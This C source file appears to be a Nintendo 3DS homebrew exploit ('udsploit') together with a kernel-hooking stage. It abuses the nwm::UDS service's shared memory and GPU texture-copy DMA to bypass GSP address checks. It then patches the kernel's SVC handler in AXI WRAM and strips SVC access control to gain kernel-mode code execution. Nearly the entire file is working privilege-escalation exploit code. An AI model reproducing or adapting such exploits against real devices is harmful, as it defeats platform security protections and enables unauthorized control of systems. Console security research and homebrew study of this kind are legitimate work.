#include <string.h>
#include <stdio.h>
#include <malloc.h>
#include <3ds.h>

Result svcMiniBackdoor(void* target);
void invalidate_icache();

// bypass gsp address checks
void gspSetTextureCopy(u32 in_pa, u32 out_pa, u32 size, u32 in_dim, u32 out_dim, u32 flags) {
	u32 enable_reg = 0;
	if (GSPGPU_ReadHWRegs(0x1EF00C18 - 0x1EB00000, &enable_reg, sizeof(enable_reg))) 		{ return; }
	if (GSPGPU_WriteHWRegs(0x1EF00C00 - 0x1EB00000, (u32[]){in_pa >> 3, out_pa >> 3}, 0x8)) { return; }
	if (GSPGPU_WriteHWRegs(0x1EF00C20 - 0x1EB00000, (u32[]){size, in_dim, out_dim}, 0xC)) 	{ return; }
	if (GSPGPU_WriteHWRegs(0x1EF00C10 - 0x1EB00000, &flags, 4)) 							{ return; }
	if (GSPGPU_WriteHWRegs(0x1EF00C18 - 0x1EB00000, (u32[]){enable_reg | 1}, 4)) 			{ return; }
}

Result initial_kernel_function(u32 garbage) {
	__asm__ volatile("cpsid aif");

	invalidate_icache();

	return 0;
}

Result hook_kernel() {
	Result ret = -200;
	const u32 wram_size = 0x00080000;
	unsigned int* wram_buffer = linearAlloc(wram_size);

	// grab AXI WRAM
	gspSetTextureCopy(0x1FF80000, osConvertVirtToPhys(wram_buffer), wram_size, 0, 0, 8);
	//I think we wait here for the GPU to kind of sync with the cache
	svcSleepThread(10 * 1000 * 1000);

	GSPGPU_InvalidateDataCache(wram_buffer, wram_size);

	// scan wram for svc handler
	u32 svc_handler_offset = 0;
	u32 svc_table_offset = 0;
	u32 svc_ac_offset = 0;
	{
		const u32 pattern[] = {0xF96D0513, 0xE94D6F00};
		for(int i = 0; i < wram_size; i += 4)
		{
			const u32 cursor = i / 4;

			if(wram_buffer[cursor] == pattern[0] && wram_buffer[cursor + 1] == pattern[1])
			{
				svc_handler_offset = i;
				for(i = svc_handler_offset; i < wram_size; i++)
				{
					const u32 val = wram_buffer[i / 4];
					if((val & 0xfffff000) == 0xe28f8000)
					{
						svc_table_offset = i + (val & 0xfff) + 8;
						break;
					}
				}

				for(i = svc_handler_offset; i < wram_size; i++)
				{
					const u32 val = wram_buffer[i / 4];
					if(val == 0x0AFFFFEA)
					{
						svc_ac_offset = i;
						break;
					}
				}
				break;
			}
		}

		printf("found svc_stuff %08X %08X %08X\n", (unsigned int)svc_handler_offset, (unsigned int)svc_table_offset, (unsigned int)svc_ac_offset);
	}

	ret = -201;
	if(!svc_handler_offset || !svc_table_offset || !svc_ac_offset) goto sub_fail;

	u32 svc_0x30_offset = 0;
	{
		int i;
		const u32 pattern[] = {0xE59F0000, 0xE12FFF1E, 0xF8C007F4};
		const u32 hint = wram_buffer[svc_table_offset / 4 + 0x30] & 0xfff;
		for(i = 0; i < wram_size; i += 4)
		{
			const u32 cursor = i / 4;

			if((i & 0xfff) == hint && wram_buffer[cursor] == pattern[0] && wram_buffer[cursor + 1] == pattern[1] && wram_buffer[cursor + 2] == pattern[2])
			{
				svc_0x30_offset = i;
				break;
			}
		}
		printf("found svc_0x30_offset %08X\n", (unsigned int)svc_0x30_offset);
	}

	ret = -202;
	if(!svc_0x30_offset) goto sub_fail;

	printf("patching kernel... ");

	// now we patch local svc 0x30 with "bx r0"
	wram_buffer[svc_0x30_offset / 4] = 0xE12FFF10;

	// then we dma the change over...
	{
		u32 aligned_offset = svc_0x30_offset & ~0x1ff;
		GSPGPU_FlushDataCache(&wram_buffer[aligned_offset / 4], 0x200);
		gspSetTextureCopy(osConvertVirtToPhys(&wram_buffer[aligned_offset / 4]), 0x1FF80000 + aligned_offset, 0x200, 0, 0, 8);
		svcSleepThread(10 * 1000 * 1000);
	}

	// patch 0x7b back in
	wram_buffer[svc_table_offset / 4 + 0x7b] = wram_buffer[svc_table_offset / 4 + 0x30];

	// patch svc access control out
	wram_buffer[svc_ac_offset / 4] = 0;

	// then we dma the changes over...
	{
		u32 aligned_offset = svc_ac_offset & ~0x1ff;
		GSPGPU_FlushDataCache(&wram_buffer[aligned_offset / 4], 0x2000);
		gspSetTextureCopy(osConvertVirtToPhys(&wram_buffer[aligned_offset / 4]), 0x1FF80000 + aligned_offset, 0x2000, 0, 0, 8);
		svcSleepThread(10 * 1000 * 1000);
	}

	// and finally we run that svc until it actually executes our code (should be first try, but with cache you never know i guess)
	// this will also invalidate all icache which will allow us to use svcBackdoor
	while(svcMiniBackdoor(initial_kernel_function));

	printf("done !\n");
	ret = 0;

	sub_fail:
	linearFree(wram_buffer);

	return ret;
}

// TEMP, so that we can still allocate memory; this is only needed to run in a 3dsx obviously
extern char* fake_heap_start;
extern char* fake_heap_end;
extern u32 __ctru_heap, __ctru_heap_size, __ctru_linear_heap, __ctru_linear_heap_size;

void __attribute__((weak)) __system_allocateHeaps() {
	u32 tmp=0;

	__ctru_heap_size = 8 * 1024 * 1024;

	// Allocate the application heap
	__ctru_heap = 0x08000000;
	svcControlMemory(&tmp, __ctru_heap, 0x0, __ctru_heap_size, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE);

	// Allocate the linear heap
	svcControlMemory(&__ctru_linear_heap, 0x0, 0x0, __ctru_linear_heap_size, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);

	// Set up newlib heap
	fake_heap_start = (char*)__ctru_heap;
	fake_heap_end = fake_heap_start + __ctru_heap_size;

}

static Result UDS_InitializeWithVersion(Handle* handle, udsNodeInfo *nodeinfo, Handle sharedmem_handle, u32 sharedmem_size) {
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x001B0302;
	cmdbuf[1] = sharedmem_size;
	memcpy(&cmdbuf[2], nodeinfo, sizeof(udsNodeInfo));
	cmdbuf[12] = 0x400;//version
	cmdbuf[13] = 0;
	cmdbuf[14] = sharedmem_handle;

	Result ret = 0;
	if((ret = svcSendSyncRequest(*handle))) { return ret; }
	ret = cmdbuf[1];

	return ret;
}

static Result UDS_Bind(Handle* handle, u32 BindNodeID, u32 input0, u8 data_channel, u16 NetworkNodeID) {
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x120100;
	cmdbuf[1] = BindNodeID;
	cmdbuf[2] = input0;
	cmdbuf[3] = data_channel;
	cmdbuf[4] = NetworkNodeID;

	Result ret=0;
	if((ret = svcSendSyncRequest(*handle))) { return ret; }
	ret = cmdbuf[1];

	return ret;
}

static Result UDS_Unbind(Handle* handle, u32 BindNodeID) {
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x130040;
	cmdbuf[1] = BindNodeID;

	Result ret = 0;
	if((ret = svcSendSyncRequest(*handle))) { return ret; }

	return cmdbuf[1];
}

static Result UDS_Shutdown(Handle* handle) {
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x30000;

	Result ret = 0;
	if((ret = svcSendSyncRequest(*handle))) { return ret; }

	return cmdbuf[1];
}

Result NDM_EnterExclusiveState(Handle* handle, u32 state) {
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x10042;
	cmdbuf[1] = state;
	cmdbuf[2] = 0x20;

	Result ret = 0;
	if((ret = svcSendSyncRequest(*handle))) { return ret; }

	return cmdbuf[1];
}

Result NDM_LeaveExclusiveState(Handle* handle) {
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x20002;
	cmdbuf[1] = 0x20;

	Result ret = 0;
	if((ret = svcSendSyncRequest(*handle))) { return ret; }

	return cmdbuf[1];
}

// la == linear address (output)
Result allocHeapWithLa(u32 va, u32 size, u32* la) {
	Result ret = 0;
	u32 placeholder_addr = __ctru_heap + __ctru_heap_size;
	u32 placeholder_size = 0;
	u32 linear_addr = 0;

	printf("allocate linear buffer as big as target buffer\n");
	ret = svcControlMemory((u32*)&linear_addr, 0, 0, size, 0x10003, 0x3);
	if(ret) return ret;

	printf("figure out how much memory is available\n");
	s64 tmp = 0;
	ret = svcGetSystemInfo(&tmp, 0, 1);
	if(ret) return ret;
	placeholder_size = *(u32*)0x1FF80040 - (u32)tmp; // APPMEMALLOC
	printf("%08X\n", (unsigned int)placeholder_size);


	printf("allocate placeholder to cover all free memory\n");
	ret = svcControlMemory((u32*)&placeholder_addr, (u32)placeholder_addr, 0, placeholder_size, 3, 3);
	if(ret) return ret;
	
	printf("free linear block\n");
	ret = svcControlMemory((u32*)&linear_addr, (u32)linear_addr, 0, size, 1, 0);
	if(ret) return ret;

	printf("allocate regular heap to replace it: we know its PA\n");
	ret = svcControlMemory((u32*)&va, (u32)va, 0, size, 3, 3);
	if(ret) return ret;

	printf("free placeholder memory\n");
	ret = svcControlMemory((u32*)&placeholder_addr, (u32)placeholder_addr, 0, placeholder_size, 1, 0);
	if(ret) return ret;

	if(la) *la = linear_addr;

	return 0;
}

Result udsploit() {
	Handle udsHandle = 0;
	Handle ndmHandle = 0;
	Result ret = 0;

	const u32 sharedmem_size = 0x1000;
	Handle sharedmem_handle = 0;
	u32 sharedmem_va = 0x0dead000, sharedmem_la = 0;

	printf("udsploit: srvGetServiceHandle\n");
	if (srvGetServiceHandle(&udsHandle, "nwm::UDS")) { goto fail; }

	printf("udsploit: srvGetServiceHandle\n");
	if (srvGetServiceHandle(&ndmHandle, "ndm:u")) { goto fail; }


	{
		printf("udsploit: allocHeapWithPa\n");
		ret = allocHeapWithLa(sharedmem_va, sharedmem_size, &sharedmem_la);
		if(ret)
		{
			sharedmem_va = 0;
			goto fail;
		}

		printf("udsploit: sharedmem_la %08X\n", (unsigned int)sharedmem_la);

		printf("udsploit: svcCreateMemoryBlock\n");
		memset((void*)sharedmem_va, 0, sharedmem_size);
		ret = svcCreateMemoryBlock(&sharedmem_handle, (u32)sharedmem_va, sharedmem_size, 0x0, MEMPERM_READ | MEMPERM_WRITE);
		if(ret) goto fail;
	}

	printf("udsploit: NDM_EnterExclusiveState\n");
	ret = NDM_EnterExclusiveState(&ndmHandle, 2); // EXCLUSIVE_STATE_LOCAL_COMMUNICATIONS
	if(ret) goto fail;

	printf("udsploit: UDS_InitializeWithVersion\n");
	udsNodeInfo nodeinfo = {0};
	ret = UDS_InitializeWithVersion(&udsHandle, &nodeinfo, sharedmem_handle, sharedmem_size);
	if(ret) goto fail;

	printf("udsploit: NDM_LeaveExclusiveState\n");
	ret = NDM_LeaveExclusiveState(&ndmHandle);
	if(ret) goto fail;

	printf("udsploit: UDS_Bind\n");
	u32 BindNodeID = 1;
	ret = UDS_Bind(&udsHandle, BindNodeID, 0xff0, 1, 0);
	if(ret) goto fail;

	{
		unsigned int* buffer = linearAlloc(sharedmem_size);

		GSPGPU_InvalidateDataCache(buffer, sharedmem_size);

		svcSleepThread(1 * 1000 * 1000);
		GX_TextureCopy((void*)sharedmem_la, 0, (void*)buffer, 0, sharedmem_size, 8);
		svcSleepThread(1 * 1000 * 1000);

		int i;
		for(i = 0; i < 8; i++) printf("%08X %08X %08X %08X\n", buffer[i * 4 + 0], buffer[i * 4 + 1], buffer[i * 4 + 2], buffer[i * 4 + 3]);
					
		buffer[3] = 0x1EC40140 - 8;

		GSPGPU_FlushDataCache(buffer, sharedmem_size);
		GX_TextureCopy((void*)buffer, 0, (void*)sharedmem_la, 0, sharedmem_size, 8);
		svcSleepThread(1 * 1000 * 1000);

		linearFree(buffer);
	}

	printf("udsploit: UDS_Unbind\n");
	ret = UDS_Unbind(&udsHandle, BindNodeID);
	fail:
	if(udsHandle) { UDS_Shutdown(&udsHandle); }
	if(ndmHandle) { svcCloseHandle(ndmHandle); }
	if(udsHandle) { svcCloseHandle(udsHandle); }
	if(sharedmem_handle) { svcCloseHandle(sharedmem_handle); }
	if(sharedmem_va) { svcControlMemory((u32*)&sharedmem_va, (u32)sharedmem_va, 0, sharedmem_size, 0x1, 0); }
	return ret;
}